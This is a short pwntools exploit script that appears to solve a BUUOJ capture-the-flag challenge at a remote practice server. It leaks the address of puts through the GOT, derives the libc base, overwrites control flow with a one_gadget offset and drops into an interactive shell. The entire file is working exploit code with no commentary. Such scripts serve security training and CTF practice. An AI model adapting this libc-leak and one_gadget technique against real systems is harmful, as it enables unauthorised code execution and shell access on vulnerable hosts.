from pwn import *
from config import path
elf = ELF(path)
p = remote("node4.buuoj.cn",27751)
# p = process(path)
libc = ELF(".buuoj/16/64/libc.so.6")
# libc = elf.libc
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
 
puts_got = elf.got['puts']
p.sendlineafter('Read location?',str(puts_got))
p.recvuntil('0x')
#pause()
puts_addr = int(p.recvuntil('\n'),16)
#pause() 

libcbase = puts_addr - libc.symbols['puts']
onegadget = libcbase + one_gadget[0]
 
p.sendline(str(onegadget)) 
 
p.interactive()